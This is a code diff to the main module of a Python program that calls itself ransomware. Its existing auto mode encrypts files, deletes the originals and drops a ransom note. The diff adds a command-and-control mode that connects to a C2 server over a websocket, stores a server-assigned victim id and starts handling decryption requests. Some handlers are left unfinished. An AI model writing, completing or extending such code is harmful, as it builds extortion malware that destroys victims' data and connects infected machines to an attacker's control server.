@@ -1,5 +1,8 @@
 import os
 from crypto import CryptoGraphy
+from websocket_client import WebsocketClient
+import asyncio
+import json
 
 class Program():
     def __init__(self, data = None, mode = "manual", system = "Darwin"):
@@ -9,20 +12,22 @@ class Program():
         self.__directories_with_files = []
         self.__found_files = []
         self.__should_cli_run = True
+        self.__id = ""
+        self.__client: WebsocketClient = None
         if data is not None:
             self.__found_files = data.get("found_files", [])
             self.__directories_with_files = data.get("directories_with_files", [])
         
-    def start(self):
+    async def start(self):
         print("This is the ransomware main module.")
         print("What would you like to do?")
         match self.__mode__:
             case "auto":
                 self.__auto_mode()
             case "manual":
-                self.__cli()
+                await self.__cli()
             case "c2":
-                print("C2 mode is not yet implemented.")
+                await self.__c2_mode()
 
     def __help(self):
         print("Available commands:")
@@ -61,7 +66,7 @@ class Program():
         print("\n")
         print("USE AT YOUR OWN RISK!\n")
 
-    def __change_mode(self, new_mode = "manual"):
+    async def __change_mode(self, new_mode = "manual"):
         print(f"Mode changed to {new_mode}")
         match new_mode:
             case "auto":
@@ -70,10 +75,12 @@ class Program():
                 self.__auto_mode()
             case "c2":
                 print("C2 mode selected. The program will attempt to connect to a command and control server.")
+                self.__should_cli_run = False
+                await self.__c2_mode()
             case "manual":
                 print("Manual mode selected. The program will wait for user input.")
                 if self.__mode__ != new_mode:
-                    self.__cli()
+                    await self.__cli()
 
         self.__mode__ = new_mode
     
@@ -125,7 +132,8 @@ class Program():
             json.dump({
                 "found_files": self.__found_files,
                 "directories_with_files": self.__directories_with_files,
-                "mode": self.__mode
+                "mode": self.__mode,
+                "id": self.__id
             }, output_file, indent=4)
 
         print(self.__directories_with_files)
@@ -221,7 +229,7 @@ class Program():
         import sys
         print(sys.path)
 
-    def __cli(self):
+    async def __cli(self):
         while self.__should_cli_run:
             inp = input("MyCLI> ").strip()
             command = inp.split()[0]
@@ -239,7 +247,7 @@ class Program():
                 case "changeMode":
                     print(inp.split()[1])
                     if len(inp.split()) > 1 and inp.split()[1] in ["auto", "c2", "manual"]:
-                        self.__change_mode(inp.split()[1])
+                        await self.__change_mode(inp.split()[1])
                     else:
                         print("Mode not available. Available modes: auto, c2, manual")
 
@@ -290,6 +298,30 @@ class Program():
         self.__setup(should_encrypt=True, should_delete_original=True)
         self.__encrypt()
         self.__ransomnote()
+
+    async def __c2_mode(self):
+        print("C2 mode is not yet implemented.")
+        self.__envcheck()
+        self.__client = WebsocketClient(username=self.__system__, 
+                        system=self.__system__, 
+                        handler=self.__message_handler)
+        await self.__client.connect()
+
+    def __message_handler(self, message: dict):
+        #TODO: finish this function
+        match message.get("type"):
+            case "set_id":
+                self.__id = message.get("data", {}).get("id", "")
+            case "decrypt_req":
+                pass
+            case _:
+                print(f"Unknown message type from C2 server: {message.get('type')}")
+
+    async def send_decryption_request(self):
+        if self.__client is not None:
+            await self.__client.send_decryption_req()
+
+
         
 
     def load_key(self, key_filename: str = "secret.key"):
@@ -298,11 +330,10 @@ class Program():
         return self.__criptography.load_key(key_filename)
 
 if __name__ == "__main__":
-    import os
     from dotenv import load_dotenv
     
     load_dotenv()
     mode = os.getenv("MODE", "manual")
 
     program = Program(mode=mode)
-    program.start() 
+    asyncio.run(program.start()) 
